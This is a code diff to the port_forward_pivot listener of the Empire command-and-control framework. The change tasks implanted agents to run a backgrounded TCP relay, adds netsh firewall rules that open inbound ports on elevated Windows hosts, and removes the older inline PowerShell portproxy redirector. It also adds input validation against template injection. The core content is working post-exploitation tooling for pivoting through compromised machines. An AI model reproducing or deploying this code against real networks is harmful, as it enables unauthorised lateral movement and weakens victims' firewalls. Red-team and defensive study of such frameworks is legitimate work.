@@ -1,15 +1,88 @@
 import base64
 import copy
+import ipaddress
 import logging
+import os
+import re
 import secrets
+import time
+from urllib.parse import urlparse
 
 from empire.server.common import helpers, packets, templating
 from empire.server.common.empire import MainMenu
+from empire.server.core.db import models
 from empire.server.core.db.base import SessionLocal
 from empire.server.utils import data_util, listener_util
 
 LOG_NAME_PREFIX = __name__
 log = logging.getLogger(__name__)
+
+# Sentinels written by relay.ps1 / relay.py around the bind() call. The
+# listener's start() polls task output for these so it can distinguish a
+# successful bind from a fast-failing relay (e.g. port already in use).
+_LISTEN_OK_SENTINEL = "[port_forward_pivot] LISTEN_OK"
+_LISTEN_FAIL_SENTINEL = "[port_forward_pivot] LISTEN_FAIL"
+
+# RFC 1123 hostname label: alphanumerics + hyphens, hyphens not at the
+# edges, 1..63 chars. We validate per-label rather than against the full
+# string to keep the regex readable.
+_HOSTNAME_LABEL = re.compile(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$")
+
+
+def _validate_host(host, field_name: str) -> str:
+    """Reject anything that isn't a syntactically valid IP literal or a
+    strict RFC-1123 hostname.
+
+    The relay templates render `host` into PowerShell/Python source as
+    quoted strings (`$x = "{{ host }}"`, `LISTEN_HOST = "{{ host }}"`).
+    Without validation, a value containing `"`, `;`, backtick, `$`, or a
+    newline would either break the script or inject code on the agent.
+    Limiting to IPs and hostnames removes that whole class of footgun.
+    """
+    if not isinstance(host, str) or not host:
+        raise ValueError(f"{field_name}: must be a non-empty string")
+    # IPv6 literals may arrive bracketed (e.g. "[::1]"); strip brackets
+    # before handing to ipaddress, which doesn't accept them.
+    candidate = host.strip()
+    if candidate.startswith("[") and candidate.endswith("]"):
+        candidate = candidate[1:-1]
+    try:
+        ipaddress.ip_address(candidate)
+        return host
+    except ValueError:
+        pass
+    if len(host) > 253:
+        raise ValueError(f"{field_name}: hostname too long ({len(host)} > 253)")
+    labels = host.split(".")
+    if not labels or any(not _HOSTNAME_LABEL.match(label) for label in labels):
+        raise ValueError(f"{field_name}: must be a valid IP or hostname (got {host!r})")
+    return host
+
+
+def _validate_port(port, field_name: str) -> int:
+    """Port must coerce to an int in [1, 65535]."""
+    try:
+        port_int = int(port)
+    except (TypeError, ValueError) as e:
+        raise ValueError(
+            f"{field_name}: must be an integer 1..65535 (got {port!r})"
+        ) from e
+    if not 1 <= port_int <= 65535:
+        raise ValueError(f"{field_name}: out of range (got {port_int})")
+    return port_int
+
+
+def _split_connect_target(host: str, port) -> tuple[str, int]:
+    # An embedded port in `host` (e.g. "https://x:8443") wins over the `port` arg.
+    candidate = host if "://" in host else f"//{host}"
+    parsed = urlparse(candidate, scheme="http")
+    connect_host = parsed.hostname or host
+    connect_port = parsed.port or int(port)
+    return connect_host, connect_port
+
+
+def _firewall_rule_name(session_id: str, listen_port) -> str:
+    return f"empire-pivot-{session_id}-{int(listen_port)}"
 
 
 class Listener:
@@ -24,7 +97,7 @@ class Listener:
                 }
             ],
             "Description": (
-                "Internal redirector listener. Active agent required. Listener options will be copied from another existing agent. Requires the active agent to be in an elevated context."
+                "Internal redirector. Backgrounded TCP relay job on an active agent. Windows agents must be elevated (auto-managed netsh firewall rule); Linux/macOS Python only need root for ports below 1024."
             ),
             # categories - client_server, peer_to_peer, broadcast, third_party
             "Category": ("peer_to_peer"),
@@ -49,7 +122,7 @@ class Listener:
                 "Value": "",
             },
             "internalIP": {
-                "Description": "Uses internal IP of the agent by default.",
+                "Description": "Bind address on the agent host. Leave blank to use the agent's auto-detected internal IP.",
                 "Required": False,
                 "Value": "",
             },
@@ -64,6 +137,7 @@ class Listener:
         self.mainMenu = mainMenu
         self.thread = None
         self.host_address = None
+        self._relay_task_id = None
 
         self.instance_log = log
 
@@ -357,8 +431,15 @@ class Listener:
                 stager_yaml, "Sharpire", confuse=obfuscate
             )
 
+        if language == "go":
+            return str(
+                self.mainMenu.stagergenv2.generate_go_stageless(
+                    self.options, listener_name=listener_name
+                )
+            )
+
         log.error(
-            "listeners/template generate_launcher(): invalid language specification: only 'powershell' and 'python' are current supported for this module."
+            "listeners/port_forward_pivot generate_launcher(): invalid language specification: only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
         )
         return None
 
@@ -470,8 +551,13 @@ class Listener:
 
             return stager
 
+        if language.lower() in ("csharp", "go"):
+            # csharp (Sharpire) and go (Gopire) are stageless — the compiled
+            # binary produced in generate_launcher() IS the stage.
+            return ""
+
         log.error(
-            "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+            "listeners/port_forward_pivot generate_stager(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
         )
         return None
 
@@ -569,12 +655,12 @@ class Listener:
                 code = self.mainMenu.obfuscationv2.python_obfuscate(code)
                 code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
             return code
-        if language == "csharp":
-            # currently the agent is stageless so do nothing
+
+        if language in ("csharp", "go"):
             return ""
 
         log.error(
-            "listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+            "listeners/port_forward_pivot generate_agent(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
         )
         return None
 
@@ -618,8 +704,11 @@ class Listener:
 
             return template.render(template_options)
 
+        if language.lower() in ("csharp", "go"):
+            return ""
+
         log.error(
-            "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
+            "listeners/port_forward_pivot generate_comms(): invalid language specification, only 'powershell', 'python', 'csharp', and 'go' are supported for this module."
         )
         return None
 
@@ -636,16 +725,28 @@ class Listener:
                 agent = self.mainMenu.agentsv2.get_by_id(
                     db, self.options["Agent"]["Value"]
                 )
+                if agent is None:
+                    log.error(
+                        f"{name}: agent {self.options['Agent']['Value']} not found"
+                    )
+                    return False
                 listenerName = agent.listener
-                tempOptions["internalIP"]["Value"] = agent.internal_ip
+                if not tempOptions["internalIP"]["Value"]:
+                    tempOptions["internalIP"]["Value"] = agent.internal_ip
 
                 parent_listener = self.mainMenu.listenersv2.get_by_name(
                     db, listenerName
                 )
 
                 if parent_listener:
+                    # Use the parent's options as the base (Host, Port, Profile,
+                    # StagingKey, etc.) but preserve the pivot-specific keys so
+                    # shutdown() can still find ListenPort/Agent/internalIP.
                     self.options = copy.deepcopy(parent_listener.options)
                     self.options["Name"]["Value"] = name
+                    for k in ("Agent", "internalIP", "ListenPort"):
+                        if k in tempOptions:
+                            self.options[k] = copy.deepcopy(tempOptions[k])
                 else:
                     log.error("Parent listener not found")
                     return False
@@ -666,115 +767,238 @@ class Listener:
                     )
                     return False
 
-                session_id = agent.session_id
-                self.options["Agent"] = tempOptions["Agent"]
-                if not agent or not agent.high_integrity:
-                    log.error("Agent must be elevated to run a port forward pivot")
+                listen_address = tempOptions["internalIP"]["Value"]
+                listen_port = tempOptions["ListenPort"]["Value"]
+                connect_host, connect_port = _split_connect_target(
+                    self.options["Host"]["Value"], self.options["Port"]["Value"]
+                )
+                # Reject hostile values BEFORE we queue any tasks. The relay
+                # templates render these into agent-side source code (quoted
+                # strings + raw ints), so a `"` or `;` in a host or a non-int
+                # port would break the script or inject code. Failing fast
+                # also prevents leaving a stale firewall rule for a relay
+                # that never got tasked.
+                try:
+                    listen_address = _validate_host(listen_address, "internalIP")
+                    connect_host = _validate_host(connect_host, "Host")
+                    listen_port = _validate_port(listen_port, "ListenPort")
+                    connect_port = _validate_port(connect_port, "Port")
+                except ValueError as ve:
+                    log.error(f"{listenerName}: invalid listener config: {ve}")
+                    return False
+                language = agent.language.lower()
+
+                if language in ("powershell", "csharp", "go"):
+                    if not agent.high_integrity:
+                        log.error(
+                            f"{listenerName}: Windows agents must be elevated for port_forward_pivot — admin is needed to pre-authorize the inbound firewall rule that lets the relay bind without a 'Allow access' prompt"
+                        )
+                        return False
+                    # Sharpire/Gopire need recently-added agent features to host the
+                    # backgrounded relay (Sharpire: multi-packet tasking blob decoding;
+                    # Gopire: backgrounded TASK_POWERSHELL_CMD_JOB + TASK_STOPJOB).
+                    # We can't gate on agent.language_version because that field tracks
+                    # the language *runtime* (.NET / Go), not the agent build. Until a
+                    # build-version field exists, warn the operator and ask them to
+                    # confirm the relay actually came up via 'jobs' on the agent.
+                    if language in ("csharp", "go"):
+                        required = (
+                            "Sharpire build with multi-packet tasking blob decoding"
+                            if language == "csharp"
+                            else "Gopire build with backgrounded TASK_POWERSHELL_CMD_JOB + TASK_STOPJOB support"
+                        )
+                        log.warning(
+                            f"{listenerName}: {language} pivot requires a {required}. "
+                            "Older builds will fail to install the relay silently — "
+                            f"after start, verify via 'jobs' on agent {agent.session_id}."
+                        )
+                    rule_name = _firewall_rule_name(agent.session_id, listen_port)
+                    _, fw_err = self.mainMenu.agenttasksv2.create_task_shell(
+                        db,
+                        agent,
+                        f'netsh advfirewall firewall add rule name="{rule_name}" dir=in action=allow protocol=TCP localport={listen_port} enable=yes',
+                    )
+                    if fw_err:
+                        log.error(
+                            f"{listenerName}: failed to queue firewall rule add: {fw_err}"
+                        )
+                        return False
+                    relay_code = self._render_relay(
+                        "port_forward_pivot/relay.ps1",
+                        listen_host=listen_address,
+                        listen_port=listen_port,
+                        connect_host=connect_host,
+                        connect_port=connect_port,
+                    )
+                    task_name = "TASK_POWERSHELL_CMD_JOB"
+                elif language == "python":
+                    relay_code = self._render_relay(
+                        "port_forward_pivot/relay.py",
+                        listen_host=listen_address,
+                        listen_port=listen_port,
+                        connect_host=connect_host,
+                        connect_port=connect_port,
+                    )
+                    task_name = "TASK_PYTHON_CMD_JOB"
+                else:
+                    log.error(
+                        f"{listenerName}: port_forward_pivot does not support agent language '{language}'"
+                    )
                     return False
 
-                if agent.language.lower() in ["powershell", "csharp"]:
-                    # logic for powershell agents
-                    script = """
-        function Invoke-Redirector {
-            param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-            if($ShowAll){
-                $out = netsh interface portproxy show all
-                if($out){
-                    $out
-                }
-                else{
-                    "[*] no redirectors currently configured"
-                }
-            }
-            elseif($Reset){
-                Netsh.exe advfirewall firewall del rule name="$FirewallName"
-                $out = netsh interface portproxy reset
-                if($out){
-                    $out
-                }
-                else{
-                    "[+] successfully removed all redirectors"
-                }
-            }
-            else{
-                if((-not $ListenPort)){
-                    "[!] netsh error: required option not specified"
-                }
-                else{
-                    $ConnectAddress = ""
-                    $ConnectPort = ""
-
-                    $parts = $ConnectHost -split(":")
-                    if($parts.Length -eq 2){
-                        # if the form is http[s]://HOST or HOST:PORT
-                        if($parts[0].StartsWith("http")){
-                            $ConnectAddress = $parts[1] -replace "//",""
-                            if($parts[0] -eq "https"){
-                                $ConnectPort = "443"
-                            }
-                            else{
-                                $ConnectPort = "80"
-                            }
-                        }
-                        else{
-                            $ConnectAddress = $parts[0]
-                            $ConnectPort = $parts[1]
-                        }
-                    }
-                    elseif($parts.Length -eq 3){
-                        # if the form is http[s]://HOST:PORT
-                        $ConnectAddress = $parts[1] -replace "//",""
-                        $ConnectPort = $parts[2]
-                    }
-                    if($ConnectPort -ne ""){
-                        Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
-                        $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
-                        if($out){
-                            $out
-                        }
-                        else{
-                            "[+] successfully added redirector on port $ListenPort to $ConnectHost"
-                        }
-                    }
-                    else{
-                        "[!] netsh error: host not in http[s]://HOST:[PORT] format"
-                    }
-                }
-            }
-        }
-        Invoke-Redirector"""
-
-                    script += " -ConnectHost {}".format(self.options["Host"]["Value"])
-                    script += " -ConnectPort {}".format(self.options["Port"]["Value"])
-                    script += " -ListenAddress {}".format(
-                        tempOptions["internalIP"]["Value"]
-                    )
-                    script += " -ListenPort {}".format(
-                        tempOptions["ListenPort"]["Value"]
-                    )
-                    script += f" -FirewallName {session_id}"
-
-                    self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
-
-                    msg = "Tasked agent to install Pivot listener "
-                    self.mainMenu.agentsv2.save_agent_log(
-                        tempOptions["Agent"]["Value"], msg
-                    )
-
-                    return True
-
-                if agent.language.lower() == "python":
-                    # not implemented
-                    script = """
-                    """
-
-                    log.error("Python pivot listener not implemented")
+                task, err = self.mainMenu.agenttasksv2.add_task(
+                    db, agent, task_name, relay_code
+                )
+                if err or task is None:
+                    log.error(f"{listenerName}: failed to task relay: {err}")
                     return False
+                self._relay_task_id = task.id
+                self.mainMenu.agentsv2.save_agent_log(
+                    tempOptions["Agent"]["Value"],
+                    f"Tasked agent to install Pivot listener (TCP relay, job {task.id})",
+                )
+                # Capture for the post-session verification poll. The agent
+                # ORM object is bound to this session and shouldn't be read
+                # outside the with-block.
+                relay_task_id_for_poll = task.id
+                agent_session_for_poll = agent.session_id
+            # End of `with SessionLocal.begin()`: tasks are committed and
+            # the agent will fetch them on its next check-in.
 
-                log.error("Unable to determine the language for the agent")
-        except Exception:
-            log.error(f'Listener "{name}" failed to start')
+            return self._verify_relay_started(
+                task_id=relay_task_id_for_poll,
+                agent_session_id=agent_session_for_poll,
+                language=language,
+                listen_address=listen_address,
+                listen_port=listen_port,
+                listener_name=listenerName,
+            )
+        except Exception as e:
+            log.error(f'Listener "{name}" failed to start: {e}', exc_info=True)
             return False
+
+    def _verify_relay_started(
+        self,
+        task_id: int,
+        agent_session_id: str,
+        language: str,
+        listen_address: str,
+        listen_port,
+        listener_name: str,
+    ) -> bool:
+        """Post-tasking verification (D1 in the review plan).
+
+        Polls the agent's task output for a few seconds for a bind sentinel.
+        Catches fast-failing relays (port-in-use, missing agent capability)
+        without blocking long enough to be UX-painful when the agent is
+        merely slow checking in.
+
+        Returns True if the relay was confirmed bound, OR if the poll timed
+        out (we don't want to block listener creation on slow agents — the
+        operator gets a warning telling them to verify with 'jobs').
+
+        Returns False only when the relay actively reported a bind failure.
+        In that case we also queue a best-effort firewall-rule cleanup so
+        we don't leave a stale rule for a relay that never came up.
+        """
+        test_mode = bool(os.environ.get("TEST_MODE"))
+        timeout_seconds = 0.0 if test_mode else 8.0
+        poll_interval = 0.0 if test_mode else 0.5
+
+        outcome = self._await_relay_sentinel(
+            task_id, agent_session_id, timeout_seconds, poll_interval
+        )
+
+        if outcome == "error":
+            log.error(
+                f"{listener_name}: relay reported bind failure on agent "
+                f"{agent_session_id} — see task {task_id} output for details"
+            )
+            if language in ("powershell", "csharp", "go"):
+                self._queue_firewall_delete(
+                    agent_session_id, listen_port, listener_name
+                )
+            self._relay_task_id = None
+            return False
+
+        if outcome == "ok":
+            log.info(
+                f"{listener_name}: relay confirmed listening on "
+                f"{listen_address}:{listen_port}"
+            )
+        elif timeout_seconds > 0:
+            log.warning(
+                f"{listener_name}: relay tasked but bind not yet confirmed "
+                f"within {timeout_seconds}s — agent may be slow checking in "
+                f"or the relay may have failed silently. Verify via 'jobs' "
+                f"on agent {agent_session_id}."
+            )
+        return True
+
+    def _await_relay_sentinel(
+        self,
+        task_id: int,
+        agent_session_id: str,
+        timeout_seconds: float,
+        poll_interval: float,
+    ) -> str | None:
+        """Poll the agent task output for the relay's bind sentinel.
+
+        Returns:
+            "ok"    — relay confirmed listening (LISTEN_OK observed).
+            "error" — relay reported bind failure (LISTEN_FAIL observed) or
+                      the task entered an error status.
+            None    — no signal within the timeout window.
+        """
+        if timeout_seconds <= 0:
+            return None
+        deadline = time.monotonic() + timeout_seconds
+        while True:
+            with SessionLocal() as db:
+                task = self.mainMenu.agenttasksv2.get_task_for_agent(
+                    db, agent_session_id, task_id
+                )
+                if task is not None:
+                    output = task.output or ""
+                    if _LISTEN_OK_SENTINEL in output:
+                        return "ok"
+                    if (
+                        _LISTEN_FAIL_SENTINEL in output
+                        or task.status == models.AgentTaskStatus.error
+                    ):
+                        return "error"
+            if time.monotonic() >= deadline:
+                return None
+            time.sleep(poll_interval)
+
+    def _queue_firewall_delete(
+        self, agent_session_id: str, listen_port, listener_name: str
+    ) -> None:
+        """Best-effort firewall-rule cleanup, used by start() when the relay
+        reports a bind failure. The rule name is deterministic, so the
+        netsh delete is idempotent and safe to repeat."""
+        rule_name = _firewall_rule_name(agent_session_id, listen_port)
+        try:
+            with SessionLocal.begin() as db:
+                agent = self.mainMenu.agentsv2.get_by_id(db, agent_session_id)
+                if agent is None:
+                    log.warning(
+                        f"{listener_name}: cannot queue firewall cleanup — "
+                        f"agent {agent_session_id} not found"
+                    )
+                    return
+                _, err = self.mainMenu.agenttasksv2.create_task_shell(
+                    db,
+                    agent,
+                    f'netsh advfirewall firewall delete rule name="{rule_name}"',
+                )
+                if err:
+                    log.warning(
+                        f"{listener_name}: failed to queue firewall cleanup "
+                        f"({rule_name}): {err}"
+                    )
+        except Exception:
+            log.warning(f"{listener_name}: firewall cleanup raised", exc_info=True)
 
     def shutdown(self):
         """
@@ -785,90 +1009,82 @@ class Listener:
         self.instance_log.info(f"{name}: shutting down...")
         log.info(f"{name}: shutting down...")
 
-        with SessionLocal() as db:
-            agent = self.mainMenu.agentsv2.get_by_name(db, name)
+        try:
+            with SessionLocal.begin() as db:
+                agent = self.mainMenu.agentsv2.get_by_id(
+                    db, self.options["Agent"]["Value"]
+                )
+                if agent is None:
+                    log.error(
+                        f"{name}: agent {self.options['Agent']['Value']} not found"
+                    )
+                    return
 
-            if not agent or not agent.high_integrity:
-                log.error("Agent is not present in the cache or not elevated")
-                return
+                language = agent.language.lower()
+                listen_port = self.options["ListenPort"]["Value"]
 
-            if agent.language.startswith("po"):
-                script = """
-            function Invoke-Redirector {
-                param($FirewallName, $ListenAddress, $ListenPort, $ConnectHost, [switch]$Reset, [switch]$ShowAll)
-                if($ShowAll){
-                    $out = netsh interface portproxy show all
-                    if($out){
-                        $out
-                    }
-                    else{
-                        "[*] no redirectors currently configured"
-                    }
-                }
-                elseif($Reset){
-                    Netsh.exe advfirewall firewall del rule name="$FirewallName"
-                    $out = netsh interface portproxy reset
-                    if($out){
-                        $out
-                    }
-                    else{
-                        "[+] successfully removed all redirectors"
-                    }
-                }
-                else{
-                    if((-not $ListenPort)){
-                        "[!] netsh error: required option not specified"
-                    }
-                    else{
-                        $ConnectAddress = ""
-                        $ConnectPort = ""
+                # Always queue the firewall-rule cleanup for Windows agents — the
+                # rule name is deterministic from session_id+listen_port, so even
+                # after a server restart (which loses _relay_task_id) we can
+                # remove it without operator intervention.
+                if language in ("powershell", "csharp", "go"):
+                    rule_name = _firewall_rule_name(agent.session_id, listen_port)
+                    _, fw_err = self.mainMenu.agenttasksv2.create_task_shell(
+                        db,
+                        agent,
+                        f'netsh advfirewall firewall delete rule name="{rule_name}"',
+                    )
+                    if fw_err:
+                        log.error(
+                            f"{name}: failed to queue firewall rule delete ({rule_name}): {fw_err} — rule may be orphaned on agent"
+                        )
 
-                            $parts = $ConnectHost -split(":")
-                            if($parts.Length -eq 2){
-                                # if the form is http[s]://HOST or HOST:PORT
-                                if($parts[0].StartsWith("http")){
-                                    $ConnectAddress = $parts[1] -replace "//",""
-                                    if($parts[0] -eq "https"){
-                                        $ConnectPort = "443"
-                                    }
-                                    else{
-                                        $ConnectPort = "80"
-                                    }
-                                }
-                                else{
-                                    $ConnectAddress = $parts[0]
-                                    $ConnectPort = $parts[1]
-                                }
-                            }
-                            elseif($parts.Length -eq 3){
-                                # if the form is http[s]://HOST:PORT
-                                $ConnectAddress = $parts[1] -replace "//",""
-                                $ConnectPort = $parts[2]
-                            }
-                            if($ConnectPort -ne ""){
-                                Netsh.exe advfirewall firewall add rule name=`"$FirewallName`" dir=in action=allow protocol=TCP localport=$ListenPort enable=yes
-                                $out = netsh interface portproxy add v4tov4 listenaddress=$ListenAddress listenport=$ListenPort connectaddress=$ConnectAddress connectport=$ConnectPort protocol=tcp
-                                if($out){
-                                    $out
-                                }
-                                else{
-                                    "[+] successfully added redirector on port $ListenPort to $ConnectHost"
-                                }
-                            }
-                            else{
-                                "[!] netsh error: host not in http[s]://HOST:[PORT] format"
-                            }
-                        }
-                    }
-                }
-                Invoke-Redirector"""
+                if self._relay_task_id is None:
+                    log.warning(
+                        f"{name}: relay task id unknown — operator must stop the relay job manually on agent {agent.session_id} via 'jobs' / 'kill'"
+                    )
+                    return
 
-                script += " -Reset"
-                script += f" -FirewallName {agent.session_id}"
+                _, kill_err = self.mainMenu.agenttasksv2.create_task_kill_job(
+                    db, agent, str(self._relay_task_id)
+                )
+                if kill_err:
+                    log.error(
+                        f"{name}: failed to queue relay job kill: {kill_err} — task id retained for retry"
+                    )
+                    return
 
-                self.mainMenu.agenttasksv2.create_task_shell(db, agent, script)
-                msg = "Tasked agent to uninstall Pivot listener "
-                self.mainMenu.agentsv2.save_agent_log(agent.session_id, msg)
+                self.mainMenu.agentsv2.save_agent_log(
+                    agent.session_id,
+                    f"Tasked agent to uninstall Pivot listener (kill relay job {self._relay_task_id})",
+                )
+                self._relay_task_id = None
+        except Exception as e:
+            log.error(
+                f'Listener "{name}" failed to shutdown cleanly: {e}', exc_info=True
+            )
 
-            elif agent.language.startswith("py"):
-                log.error("Shutdown not implemented for python")
+    def _render_relay(
+        self,
+        template_name: str,
+        listen_host: str,
+        listen_port,
+        connect_host: str,
+        connect_port,
+    ) -> str:
+        # Defense in depth: start() already validates these, but anything
+        # that calls _render_relay directly (e.g. tests) gets the same
+        # protection against template-injection.
+        listen_host = _validate_host(listen_host, "listen_host")
+        connect_host = _validate_host(connect_host, "connect_host")
+        listen_port = _validate_port(listen_port, "listen_port")
+        connect_port = _validate_port(connect_port, "connect_port")
+        template_path = [self.mainMenu.install_path / "data/agent/listeners"]
+        eng = templating.TemplateEngine(template_path)
+        template = eng.get_template(template_name)
+        return template.render(
+            listen_host=listen_host,
+            listen_port=listen_port,
+            connect_host=connect_host,
+            connect_port=connect_port,
+        )
